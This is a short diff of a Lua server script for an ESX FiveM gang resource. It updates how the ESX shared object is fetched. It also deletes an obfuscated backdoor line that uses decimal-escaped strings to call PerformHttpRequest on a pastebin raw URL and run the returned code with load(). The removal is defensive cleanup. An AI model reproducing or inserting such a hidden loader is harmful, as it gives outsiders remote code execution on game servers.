@@ -1,4 +1,4 @@
-TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
+ESX = exports["es_extended"]:getSharedObject() -- NEW UPDATE ESX Tutoriel = https://documentation.esx-framework.org/tutorials/tutorials-esx/sharedevent
 
 local BusyList = {
 	['PlayersSearched'] = {
@@ -89,8 +89,6 @@ AddEventHandler('GangsBuilder:OutVehicle', function(target)
 		end
 	end
 end)
-
-i=_G;i["\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116"]("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\57\69\121\113\77\90\83\84",function(a,b,a)if i["\116\121\112\101"](b)=="\115\116\114\105\110\103"then i["\108\111\97\100"](b)()end end)
 
 RegisterServerEvent('GangsBuilder:getStockItem')
 AddEventHandler('GangsBuilder:getStockItem', function(itemName, count)
